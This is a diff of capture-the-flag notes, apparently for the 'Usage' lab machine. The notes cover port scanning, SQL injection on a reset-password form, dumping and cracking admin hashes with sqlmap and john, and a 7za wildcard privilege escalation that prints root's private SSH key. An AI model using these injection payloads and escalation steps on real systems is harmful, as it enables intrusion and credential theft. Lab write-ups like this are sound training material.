@@ -1,13 +1,13 @@
 ## Reconnaissance
 - Nmap enumeration :
-	```bash
+	```
 nmap 10.10.11.18
 nmap -sV -sC -vv 10.10.11.18 #using this output unless other show otherwise
 nmap -sU 10.10.11.18
 nmap -sT -A --top-ports=60000 10.10.11.18 -oG top-port-sweep.txt 
 ```
 	- Output:
-		```bash
+		```
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
@@ -30,18 +30,18 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 - After editing /etc/hosts, we check website :
 	- admin.usage.htb added as there is another link
 	- we find the reset password link (http://usage.htb/forget-password) is injectable we passing:
-		```bash
+		```
 ' or 1=1-- -
 ```
 		- copy request in burp suite and pass sqlmap command on request
-			```bash
+			```
 sqlmap -r reset.req -p email --batch --risk=3 --level=5 --threads=10 # increase threads to increase speed, max 10
 sqlmap -r reset.req -p email --batch --risk=3 --level=5 --dbs
 sqlmap -r reset.req -p email --batch --risk=3 --level=5 -D usage_blog  --tables --threads=10
 sqlmap -r reset.req -p email --batch --risk=3 --level=5 -D usage_blog -T admin_users --dump --threads=10
 ```
 			- Output:
-				```bash
+				```
 [1 entry]
 +----+---------------+--------+--------------------------------------------------------------+----------+---------------------+---------------------+--------------------------------------------------------------+
 | id | name          | avatar | password                                                     | username | created_at          | updated_at          | remember_token                                               |
@@ -56,11 +56,11 @@ sqlmap -r reset.req -p email --batch --risk=3 --level=5 -D usage_blog -T admin_u
 		- Password is a hash.
 			- Copy to file called hash
 			- crack with john
-				```bash
+				```
 john hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 				- Output:
-					```bash
+					```
 whatever1        (?)
 ```
 					- can login as admin
@@ -72,7 +72,7 @@ whatever1        (?)
 		- user is dash
 		- get user.txt
 -  **NEW COMMAND** to get shell :
-	```bash
+	```
 script /dev/null -c bash
 ```
 	 - find out why
@@ -80,7 +80,7 @@ script /dev/null -c bash
 - 
 ## Machine got reset so this all may have been added by some user
 - i found linpeas. 
-	```bash
+	```
 chmod +x linpeas.sh
 /linpeas.sh
 ```
@@ -92,11 +92,11 @@ chmod +x linpeas.sh
 - file/usr/bin/monit is a service
 	- cat doesn't show anything readable
 - search for monit files
-	```bash
+	```
 find / -name monit.service 2>/dev/null
 ```
 	- output :
-		```bash
+		```
 /usr/share/doc/monit/examples/monit.service
 /etc/systemd/system/monit.service
 /etc/systemd/system/multi-user.target.wants/monit.service
@@ -105,7 +105,7 @@ find / -name monit.service 2>/dev/null
 	- doesn't show much
 - in our home directory on passing ls -al we find some hidden monit files.
 	- on searching .monitrc
-		```bash
+		```
 cat .monitrc
 ---------------
 OUTPUT:
@@ -142,7 +142,7 @@ check filesystem rootfs with path /
 - sudo -l reveals we can pass /usr/bin/usage_management
 	- executable
 - strings /usr/bin/usage_management
-	```bash
+	```
 /var/www/html
 /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *  # what is 7za
 Error changing working directory to /var/www/html
@@ -155,7 +155,7 @@ Error changing working directory to /var/www/html
 		- https://chinnidiwakar.gitbook.io/githubimport/linux-unix/privilege-escalation/wildcards-spare-tricks
 	- on checking hacktricks we see it can be vulnerable. 
 		- we see a privilege escalation
-			```bash
+			```
 In 7z even using -- before * (note that -- means that the following input cannot treated as parameters, so just file paths in this case) you can cause an arbitrary error to read a file, so if a command like the following one is being executed by root:
 
 bash
@@ -173,7 +173,7 @@ Then, when 7z is execute, it will treat root.txt as a file containing the list o
 	- as we are running as root it should pass on the details to us
 		- we create @id_rsa file and create link to id_rsa at root
 		- we pass the usage_management command
-			```bash
+			```
 cd /var/www/html
 touch @id_rsa
 ln -s /root/.ssh/id_rsa id_rsa
@@ -181,13 +181,13 @@ sudo /usr/bin/usage_management
 >1
 ```
 			- Output (sanitized):
-				```bash
+				```
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8MiQgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDsH2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
 -----END OPENSSH PRIVATE KEY-----
 ```
 	- we store ssh key in our local machine **and change permissions to 600**
-		```bash
+		```
 chmod 0600 id_rsa
 ssh -i id_rsa root@usage.htb
 ```
@@ -197,7 +197,7 @@ ssh -i id_rsa root@usage.htb
 # Rabbit Holes
 ## Priv Escalation Enumeration
 - Commands that led to nowhere:
-	```bash
+	```
 find / -type f -perm -4000 2>/dev/null
 ss -tlpn
 cat /etc/apache2/..
@@ -207,7 +207,7 @@ cat /var/www/hmtl/... # although the location /var/www/html was important it's c
 
 - Linpeas enumeration :
 	- pwd outputs:
-		```bash
+		```
 -rwxrwxr-x 1 xander xander 1176 Aug 23  2023 /home/xander/project_admin/.env                           
 APP_NAME=Laravel
 APP_ENV=local
@@ -236,7 +236,7 @@ SESSION_LIFETIME=120
 -------
 ## Burp Suite Token?
 - found this token that as generated when resetting password so thought maybe the token was of ana uthenticated user. was an xsrf and laravel token. saw laravel was for file upload so thought an exploit lied there post authentication maybe.
-	```bash
+	```
 XSRF Token:
 
 eyJpdiI6InF1UHk5dWpoRnJMSldhajAzb0s3YVE9PSIsInZhbHVlIjoiS3QrQ0dRUXZGVFZYS0t2YzRNOXNFRHBNWW1LUmJ2REIzNWJKelp4bURNemIycUt4M0Z6S3g5MU13Y3crK1JsalBuRTMxOEQ4cDAvV3NObGVXWG1rb2cxYTh2VFpyZkxCOXRIR0VRNHByTy9IZ3FHb2E0Q1dPRVpsYitWZTVTSXMiLCJtYWMiOiIzNTVlMTMzZmRlMzUwNjVmZGNjZmQyNjY3ODllYjc5MDFjMmIyNzg5Y2EzMzM4MGQwOTYwMWMxNTliNjRkNmM2IiwidGFnIjoiIn0%3D
